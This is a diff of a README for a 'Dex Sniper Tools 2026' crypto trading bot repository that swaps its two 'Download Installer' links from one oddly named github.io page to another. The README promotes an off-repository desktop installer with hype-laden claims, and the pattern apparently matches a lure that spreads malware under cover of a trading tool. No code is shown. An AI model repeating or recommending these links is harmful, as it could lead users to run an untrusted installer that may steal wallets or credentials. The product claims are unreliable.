@@ -2,7 +2,7 @@
 
 Welcome to the Dex Sniper Tools 2026 repository, the premier advanced multi-chain sniper suite for decentralized exchange traders. This powerful dex sniper tool provides real-time analytics and automated trading capabilities across Ethereum, BSC, Solana, and other major blockchains, giving you an edge in fast-moving token launches and liquidity events.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -46,7 +46,7 @@ A: Currently, we only offer a desktop application. Our development team is explo
 
 Ready to enhance your trading with our advanced multi-chain sniper platform? Get started today with the most comprehensive dex sniper tool available.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
